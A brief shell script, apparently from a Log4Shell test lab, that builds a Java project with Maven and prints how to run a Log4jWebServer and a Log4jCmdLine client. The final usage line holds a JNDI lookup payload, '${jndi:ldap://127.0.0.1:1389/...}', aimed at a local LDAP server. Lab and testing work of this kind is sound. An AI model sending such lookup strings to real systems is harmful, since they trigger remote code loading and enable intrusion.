mvn clean package assembly:single -Dmaven.test.skip=true 
echo "****************************"
echo "To execute the webserver : "
echo "java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jWebServer [Port_number]"
echo ""
echo "To execute the cmd line : "
echo "java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jCmdLine '\${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}'"
